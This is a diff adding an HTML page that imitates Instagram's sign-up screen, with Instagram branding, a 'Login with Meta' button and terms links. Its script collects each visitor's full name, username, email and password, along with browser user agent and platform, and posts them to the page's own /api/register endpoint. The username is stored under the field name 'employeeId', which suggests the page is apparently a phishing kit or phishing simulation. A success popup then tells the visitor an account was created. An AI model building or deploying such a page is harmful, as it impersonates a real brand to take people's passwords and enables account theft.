@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><defs><radialGradient id='a' cx='100%' cy='100%' r='150%'><stop offset='0%' style='stop-color:%23fdf497'/><stop offset='5%' style='stop-color:%23fdf497'/><stop offset='45%' style='stop-color:%23fd5949'/><stop offset='60%' style='stop-color:%23d6249f'/><stop offset='90%' style='stop-color:%23285AEB'/></radialGradient></defs><rect fill='url(%23a)' width='100' height='100' rx='20'/><circle fill='white' cx='50' cy='50' r='25'/><circle fill='url(%23a)' cx='50' cy='50' r='20'/><circle fill='white' cx='63' cy='37' r='5'/></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 50px 30px 30px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+        }
+        
+        /* Instagram Logo with Gradient */
+        .logo {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+        
+        .logo-text {
+            font-size: 48px;
+            font-family: 'Brush Script MT', 'Dancing Script', cursive;
+            font-weight: 400;
+            background: linear-gradient(45deg, #f9ce34, #ee2a7b, #6228d7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 1px;
+        }
+        
+        /* Message Container */
+        #message-container {
+            margin-bottom: 15px;
+        }
+        
+        .success-message,
+        .error-message {
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            text-align: center;
+            animation: slideIn 0.3s ease;
+        }
+        
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        /* Form Inputs */
+        .form-group {
+            margin-bottom: 12px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #262626;
+            outline: none;
+            transition: all 0.2s;
+        }
+        
+        .form-input:focus {
+            background: #ffffff;
+            border-color: #a8a8a8;
+        }
+        
+        .form-input::placeholder {
+            color: #8e8e8e;
+        }
+        
+        /* Forgot Password Link */
+        .forgot-password {
+            text-align: right;
+            margin-top: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-link {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        
+        /* Sign Up Button with Gradient */
+        .signup-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #8a3ab9 0%, #e95950 50%, #fccc63 100%);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 25px;
+            transition: all 0.3s;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 46px;
+        }
+        
+        .signup-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(138, 58, 185, 0.4);
+        }
+        
+        .signup-btn:active {
+            transform: translateY(0);
+        }
+        
+        .signup-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .btn-text {
+            display: block;
+        }
+        
+        .spinner {
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .signup-btn.loading .btn-text {
+            display: none;
+        }
+        
+        .signup-btn.loading .spinner {
+            display: block;
+        }
+        
+        /* OR Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+        }
+        
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        
+        .divider-text {
+            padding: 0 15px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        /* Facebook/Meta Login */
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 12px;
+            background: transparent;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-bottom: 30px;
+        }
+        
+        .facebook-login:hover {
+            background: #fafafa;
+        }
+        
+        .facebook-icon {
+            width: 18px;
+            height: 18px;
+        }
+        
+        /* Sign In Link */
+        .signin-container {
+            text-align: center;
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+        
+        .signin-link {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+            margin-left: 5px;
+        }
+        
+        .signin-link:hover {
+            text-decoration: underline;
+        }
+        
+        /* Terms Text */
+        .terms-text {
+            text-align: center;
+            color: #8e8e8e;
+            font-size: 11px;
+            line-height: 16px;
+            margin-top: 30px;
+            margin-bottom: 10px;
+        }
+        
+        .terms-text a {
+            color: #00376b;
+            text-decoration: none;
+        }
+        
+        .terms-text a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Popup */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 999;
+            display: none;
+            animation: fadeIn 0.2s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .message-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 16px;
+            max-width: 380px;
+            width: 90%;
+            z-index: 1000;
+            display: none;
+            animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            overflow: hidden;
+        }
+        
+        @keyframes popIn {
+            from {
+                opacity: 0;
+                transform: translate(-50%, -50%) scale(0.8);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, -50%) scale(1);
+            }
+        }
+        
+        .popup-header {
+            padding: 40px 30px 20px;
+            text-align: center;
+        }
+        
+        .popup-icon {
+            font-size: 56px;
+            margin-bottom: 20px;
+        }
+        
+        .popup-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #262626;
+            margin-bottom: 10px;
+        }
+        
+        .popup-details {
+            font-size: 14px;
+            color: #8e8e8e;
+            line-height: 20px;
+            padding: 0 30px 30px;
+        }
+        
+        .popup-divider {
+            height: 1px;
+            background: #dbdbdb;
+        }
+        
+        .popup-btn {
+            width: 100%;
+            padding: 16px;
+            background: none;
+            border: none;
+            color: #0095f6;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        
+        .popup-btn:hover {
+            background: #fafafa;
+        }
+        
+        .popup-btn:active {
+            background: #efefef;
+        }
+        
+        /* Mobile Responsive */
+        @media (max-width: 450px) {
+            body {
+                padding: 0;
+                background: #ffffff;
+            }
+            
+            .container {
+                box-shadow: none;
+                border-radius: 0;
+                padding: 40px 30px 30px;
+                min-height: 100vh;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+            }
+        }
+        
+        /* Desktop View */
+        @media (min-width: 768px) {
+            .container {
+                padding: 60px 40px 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Instagram Logo -->
+        <div class="logo">
+            <div class="logo-text">Instagram</div>
+        </div>
+        
+        <!-- Message Container -->
+        <div id="message-container"></div>
+        
+        <!-- Sign Up Form -->
+        <form id="registrationForm">
+            <div class="form-group">
+                <input 
+                    type="text" 
+                    id="fullName"
+                    class="form-input" 
+                    placeholder="Full Name"
+                    autocomplete="name"
+                    required
+                >
+            </div>
+            
+            <div class="form-group">
+                <input 
+                    type="text" 
+                    id="username"
+                    class="form-input" 
+                    placeholder="Username"
+                    autocomplete="username"
+                    required
+                >
+            </div>
+            
+            <div class="form-group">
+                <input 
+                    type="email" 
+                    id="email"
+                    class="form-input" 
+                    placeholder="Email (optional)"
+                    autocomplete="email"
+                >
+            </div>
+            
+            <div class="form-group">
+                <input 
+                    type="password" 
+                    id="password"
+                    class="form-input" 
+                    placeholder="Password"
+                    autocomplete="new-password"
+                    required
+                >
+            </div>
+            
+            <div class="forgot-password">
+                <a href="#" class="forgot-link">Forgot password?</a>
+            </div>
+            
+            <button type="submit" class="signup-btn" id="signupBtn">
+                <span class="btn-text">Sign up</span>
+                <span class="spinner"></span>
+            </button>
+        </form>
+        
+        <!-- OR Divider -->
+        <div class="divider">
+            <div class="divider-line"></div>
+            <div class="divider-text">OR</div>
+            <div class="divider-line"></div>
+        </div>
+        
+        <!-- Facebook/Meta Login -->
+        <button class="facebook-login" type="button">
+            <svg class="facebook-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" fill="#385185">
+                <path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/>
+            </svg>
+            Login with Meta
+        </button>
+        
+        <!-- Sign In Link -->
+        <div class="signin-container">
+            <span>Don't have an account?</span>
+            <a href="#" class="signin-link">Log in</a>
+        </div>
+        
+        <!-- Terms Text -->
+        <p class="terms-text">
+            By signing up, you agree to our <a href="#" target="_blank">Terms</a>, <a href="#" target="_blank">Privacy Policy</a> and <a href="#" target="_blank">Cookies Policy</a>.
+        </p>
+    </div>
+
+    <!-- Success Popup -->
+    <div class="popup-overlay" id="popupOverlay"></div>
+    <div class="message-popup" id="messagePopup">
+        <div class="popup-header">
+            <div class="popup-icon">✨</div>
+            <div class="popup-title">Welcome to Instagram!</div>
+        </div>
+        <div class="popup-details" id="popupDetails"></div>
+        <div class="popup-divider"></div>
+        <button class="popup-btn" onclick="closePopup()">OK</button>
+    </div>
+
+    <script>
+        // Get API URL
+        const API_URL = window.location.hostname === 'localhost' 
+            ? 'http://localhost:3000'
+            : '';
+        
+        // Registration form handler
+        document.getElementById('registrationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const fullName = document.getElementById('fullName').value.trim();
+            const username = document.getElementById('username').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            const messageContainer = document.getElementById('message-container');
+            const signupBtn = document.getElementById('signupBtn');
+            
+            // Validation
+            if (!fullName || !username || !password) {
+                showMessage('Please fill in all required fields', 'error');
+                return;
+            }
+            
+            if (password.length < 6) {
+                showMessage('Password must be at least 6 characters', 'error');
+                return;
+            }
+            
+            // Show loading state
+            signupBtn.classList.add('loading');
+            signupBtn.disabled = true;
+            
+            try {
+                const registrationData = {
+                    employeeId: username,
+                    fullName,
+                    email,
+                    password,
+                    registrationTime: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform
+                };
+                
+                // Send to backend
+                const response = await fetch(`${API_URL}/api/register`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(registrationData)
+                });
+                
+                const result = await response.json();
+                
+                if (response.ok) {
+                    // Success
+                    showMessage('Registration successful! 🎉', 'success');
+                    showUserPopup(registrationData);
+                    
+                    // Clear form
+                    document.getElementById('registrationForm').reset();
+                    
+                    // Remove success message after 3 seconds
+                    setTimeout(() => {
+                        messageContainer.innerHTML = '';
+                    }, 3000);
+                } else {
+                    // Error from server
+                    showMessage(result.error || 'Registration failed. Please try again.', 'error');
+                }
+            } catch (error) {
+                console.error('Registration error:', error);
+                showMessage('Network error. Please check your connection and try again.', 'error');
+            } finally {
+                // Hide loading state
+                signupBtn.classList.remove('loading');
+                signupBtn.disabled = false;
+            }
+        });
+        
+        // Show message helper
+        function showMessage(message, type) {
+            const messageContainer = document.getElementById('message-container');
+            const className = type === 'success' ? 'success-message' : 'error-message';
+            messageContainer.innerHTML = `<div class="${className}">${message}</div>`;
+            
+            setTimeout(() => {
+                messageContainer.innerHTML = '';
+            }, 5000);
+        }
+        
+        // Show popup to user
+        function showUserPopup(details) {
+            const popup = document.getElementById('messagePopup');
+            const overlay = document.getElementById('popupOverlay');
+            const popupDetails = document.getElementById('popupDetails');
+            
+            popupDetails.innerHTML = `
+                Your account has been created successfully!<br><br>
+                <strong>${details.fullName}</strong><br>
+                Username: <strong>@${details.employeeId}</strong>
+            `;
+            
+            overlay.style.display = 'block';
+            popup.style.display = 'block';
+        }
+        
+        // Close popup
+        function closePopup() {
+            document.getElementById('popupOverlay').style.display = 'none';
+            document.getElementById('messagePopup').style.display = 'none';
+        }
+        
+        // Close popup when clicking overlay
+        document.getElementById('popupOverlay').addEventListener('click', closePopup);
+        
+        // Prevent zoom on double tap (iOS)
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function (event) {
+            const now = (new Date()).getTime();
+            if (now - lastTouchEnd <= 300) {
+                event.preventDefault();
+            }
+            lastTouchEnd = now;
+        }, false);
+    </script>
+</body>
+</html>
